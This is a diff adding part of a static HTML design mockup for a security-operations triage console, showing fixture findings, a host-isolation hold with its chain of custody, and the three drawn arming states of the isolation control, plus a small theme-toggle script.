+          <span class="ent-b">dns_exfiltration → <span class="mono">data_exfiltration</span> on wks-114</span>
+          <span class="ent-r"><span class="ent-c">0.68</span><span class="cmet"><i data-lit></i><i data-lit></i><i data-lit></i><i></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">006</span><span class="ent-t">08:55:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">behavioral_anomaly → <span class="mono">lateral_movement</span> on bastion-1</span>
+          <span class="ent-r"><span class="ent-c">0.55</span><span class="cmet"><i data-lit></i><i data-lit></i><i data-lit></i><i></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">005</span><span class="ent-t">08:50:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">credential_access → <span class="mono">credential_access</span> on dc-1</span>
+          <span class="ent-r"><span class="ent-c">0.61</span><span class="cmet"><i data-lit></i><i data-lit></i><i data-lit></i><i></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">004</span><span class="ent-t">08:40:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">behavioral_anomaly → <span class="mono">data_exfiltration</span> on wks-114</span>
+          <span class="ent-r"><span class="ent-c">0.41</span><span class="cmet"><i data-lit></i><i data-lit></i><i></i><i></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">003</span><span class="ent-t">08:35:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">persistence → <span class="mono">persistence</span> on build-1</span>
+          <span class="ent-r"><span class="ent-c">0.52</span><span class="cmet"><i data-lit></i><i data-lit></i><i data-lit></i><i></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">002</span><span class="ent-t">08:25:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">behavioral_anomaly → <span class="mono">command_and_control</span> on mail-1</span>
+          <span class="ent-r"><span class="ent-c">0.37</span><span class="cmet"><i data-lit></i><i data-lit></i><i></i><i></i><i></i></span></span></div>
+
+        <div class="ent"><span class="ent-n">001</span><span class="ent-t">08:10:00</span><span class="ent-k">Deposit</span>
+          <span class="ent-b">kubernetes_audit → <span class="mono">privilege_escalation</span> on build-1</span>
+          <span class="ent-r"><span class="ent-c">0.58</span><span class="cmet"><i data-lit></i><i data-lit></i><i data-lit></i><i></i><i></i></span></span></div>
+
+        <div class="dk-f">
+          <span><kbd>↑</kbd><kbd>↓</kbd> move</span>
+          <span><kbd>Enter</kbd> take this to the bench</span>
+          <span><kbd>R</kbd> refuse</span>
+          <span><kbd>E</kbd> promote to a case</span>
+          <span><kbd>/</kbd> search the docket</span>
+          <span><kbd>⌥ H</kbd> holds only</span>
+        </div>
+      </div>
+
+      <!-- ── the selected entry, and its chain of custody ────────────── -->
+      <aside class="prev">
+        <div class="marg-h" style="color:var(--ink)">Entry 018 · selected</div>
+        <div class="prev-card">
+          <div class="rh-id">h_a07aeacf · ambush:hold:v1</div>
+          <div class="prev-t">isolate_host</div>
+          <div style="display:flex;gap:9px;flex-wrap:wrap;margin-bottom:10px">
+            <span class="sev" data-r="4">Critical
+              <span class="reg"><i data-lit></i><i data-lit></i><i data-lit></i><i data-lit></i></span></span>
+            <span class="bdg">Tier 0 · unsigned</span>
+          </div>
+          <div class="prev-m">host-ops-1 · one host loses network connectivity<br>
+            network.egress · network.ingress<br>
+            lapses 10:16:22 UTC · 58m 37s</div>
+        </div>
+
+        <div class="marg-h" style="color:var(--ink)">Chain of custody</div>
+        <div class="prev-card" style="border-left-color:var(--page-ink2)">
+          <div class="cst">
+            <span>09:14:32.140</span><span><b>finding</b> ad87733a20dc8c74…</span>
+            <span>09:14:32.141</span><span><b>finding</b> 8ed31965a6519634…</span>
+            <span>09:14:41.130</span><span><b>finding</b> 2b1c9dceec6de43e…</span>
+            <span>09:14:41.900</span><span><b>escalation</b> c66fe87fc3abf39a…</span>
+            <span>09:14:42.600</span><span><b>hold opened</b> b9220df5739062df…</span>
+            <span>09:14:42.610</span><span><b>notice 46010</b> 518dfe2b30da32a6…</span>
+          </div>
+          <div class="unwritten"><span>your verdict · ambush:verdict:v1 — unwritten</span></div>
+          <div class="prev-m" style="margin-top:10px">Six entries exist. The seventh is the one you
+            are about to make, and it is drawn as an empty ruled line because that is what it is.</div>
+        </div>
+
+        <div class="marg-h" style="color:var(--ink);margin-top:20px">What this watch does not know</div>
+        <div class="prev-card" style="border-left-color:var(--page-rule2)">
+          <div class="void" style="margin-top:0">
+            <div class="void-h"><span>Void · median page to verdict</span></div>
+            <div class="void-b" style="font-size:var(--t-note)">No client-side timing store exists
+              yet, and the daemon records no page-to-verdict interval. The number is
+              <b>unmeasured</b>, which is a different fact from zero and is drawn as one.</div>
+          </div>
+          <div class="void" style="margin-top:12px">
+            <div class="void-h"><span>Void · promoted / suppressed</span></div>
+            <div class="void-b" style="font-size:var(--t-note)">The counter is ADR&nbsp;0018
+              follow-on work. Nothing increments it today, so it reads <b>unmeasured</b> rather
+              than <span class="mono">0 / 0</span>.</div>
+          </div>
+          <div class="cst" style="margin-top:13px">
+            <span>written this week</span><span><b>1</b> measurement</span>
+            <span>store durable</span><span><b>false</b> — it does not survive a restart</span>
+            <span>window limit</span><span><b>20</b></span>
+          </div>
+        </div>
+        <div class="marg-h" style="color:var(--ink);margin-top:20px">Notes on this watch</div>
+        <p><b>discovery is empty because no shipped detector emits it.</b> That is an absent lane,
+          not a quiet one, and the index draws the difference.</p>
+        <p><b>Three of the colony's eight typed agents are registered.</b> The other five are gated
+          off by default and emit nothing at all, so the bill draws them with the hatched mark this
+          system uses for every absence — never as a quiet grey row that reads like a running
+          agent.</p>
+        <div class="cite">fixture <span>colony[].registered</span> · <span>lanes[].empty_reason</span></div>
+        <div class="cite">fixture <span>queue.*</span> is stated at
+          <span>clock.timestamps.demo_now_ms</span> (09:20:00), where hold A has already left the
+          queue and one finding is reviewed. This board renders 09:16:05, where both holds are open
+          and none of the three findings has been reviewed. The counts above are that instant, not
+          a different fixture.</div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     C · THE THREE STATES OF THE GRANT
+     ═══════════════════════════════════════════════════════════════════ -->
+<section class="plate">
+  <div class="plate-c">
+    <span class="plate-n">C</span>
+    <span class="plate-t">Arming rules the page</span>
+    <span class="plate-s">the three states of the one control that can isolate a production host —
+      the question the whole safety argument rests on, drawn rather than described</span>
+  </div>
+
+  <div class="states">
+    <div class="state-c">
+      <div class="state-h">1 · Not armed</div>
+      <div class="field" data-s="idle">
+        <span class="field-clear"></span><span class="field-state">Not armed</span>
+        <span class="field-x">✕</span>
+        <span class="field-rule"></span>
+      </div>
+      <div class="state-n"><b>Bare stock.</b> One rule, one waiting ✕ at 6.44:1, and the words.
+        <span class="mono">Enter</span> does nothing at all.</div>
+    </div>
+    <div class="state-c">
+      <div class="state-h">2 · Armed, held</div>
+      <div class="field" data-s="held">
+        <span class="field-clear"></span><span class="field-state">Armed · Enter is held</span>
+        <span class="field-x">✕</span>
+        <span class="field-rule"></span>
+      </div>
+      <div class="state-n"><b>The ruling arrives, broken.</b> <span class="mono">G</span> was pressed
+        but slot&nbsp;II has not been read: the rules are dashes, not lines, and the words say which
+        condition is missing.</div>
+    </div>
+    <div class="state-c">
+      <div class="state-h">3 · Armed, Enter writes</div>
+      <div class="field" data-s="live">
+        <span class="field-clear"></span><span class="field-state">Armed · Enter writes</span>
+        <span class="field-x">✕</span>
+        <span class="field-rule"></span>
+      </div>
+      <div class="state-n"><b>The page is ruled in your own ink</b>, with an ink bar across the head
+        and the ✕ taking that ink. The next keystroke is permanent.</div>
+    </div>
+  </div>
+
+  <p class="grey-note" style="margin-top:24px"><b>The same three states with the colour removed.</b>
+    The difference between them is a <i>quantity of ink on the page</i>, not a tint, so it survives
+    monochrome, every form of colour blindness, and a bad monitor at arm's length. Nothing here is
+    a filled button in any state.</p>
+  <div class="states grey">
+    <div class="state-c">
+      <div class="state-h">1 · Not armed</div>
+      <div class="field" data-s="idle"><span class="field-clear"></span><span class="field-state">Not armed</span>
+        <span class="field-x">✕</span><span class="field-rule"></span></div>
+    </div>
+    <div class="state-c">
+      <div class="state-h">2 · Armed, held</div>
+      <div class="field" data-s="held"><span class="field-clear"></span><span class="field-state">Armed · Enter is held</span>
+        <span class="field-x">✕</span><span class="field-rule"></span></div>
+    </div>
+    <div class="state-c">
+      <div class="state-h">3 · Armed, Enter writes</div>
+      <div class="field" data-s="live"><span class="field-clear"></span><span class="field-state">Armed · Enter writes</span>
+        <span class="field-x">✕</span><span class="field-rule"></span></div>
+    </div>
+  </div>
+
+  <p class="grey-note" style="margin-top:26px"><b>Severity and verification tier with the colour
+    removed.</b> Rank is <i>how much wax</i> — inked, struck dry, ruled, none — plus the word plus
+    the four-tick register, three redundant encodings. The tier is a shape: a hatched stamp and a
+    hatched rule.</p>
+  <div class="grey" style="background:var(--page);padding:20px 24px;display:flex;gap:26px;flex-wrap:wrap;align-items:center">
+    <span class="sev" data-r="4">Critical <span class="reg"><i data-lit></i><i data-lit></i><i data-lit></i><i data-lit></i></span></span>
+    <span class="sev" data-r="3">High <span class="reg"><i data-lit></i><i data-lit></i><i data-lit></i><i></i></span></span>
+    <span class="sev" data-r="2">Medium <span class="reg"><i data-lit></i><i data-lit></i><i></i><i></i></span></span>
+    <span class="sev" data-r="1">Low <span class="reg"><i data-lit></i><i></i><i></i><i></i></span></span>
+    <span style="width:190px"><span class="tierstamp" style="display:block"><b>Tier 0</b><i>Unsigned</i></span></span>
+    <span style="flex:1;min-width:230px"><span class="hatchrule" style="height:38px"><span>No signature exists</span></span></span>
+  </div>
+</section>
+
+<script>
+/* the only script on this page. two jobs, neither of them decorative:
+   1. the theme toggle;
+   2. the palette legend prints the hex it is actually filled with, read out
+      of the live custom property, so the strip cannot disagree with itself
+      in either theme. */
+(function(){
+  var root=document.documentElement, btn=document.getElementById('tgl');
+  function stamp(){
+    var cs=getComputedStyle(root);
+    document.querySelectorAll('[data-v]').forEach(function(el){
+      var v=cs.getPropertyValue(el.getAttribute('data-v')).trim();
+      el.textContent=v.toUpperCase();
+    });
+    btn.textContent=(root.getAttribute('data-theme')==='light'?'Dark mode':'Light mode');
+  }
+  btn.addEventListener('click',function(){
+    root.setAttribute('data-theme', root.getAttribute('data-theme')==='light'?'dark':'light');
+  });
+  new MutationObserver(stamp).observe(root,{attributes:true,attributeFilter:['data-theme']});
+  stamp();
+})();
+</script>
+</div>
+</body>
+</html>
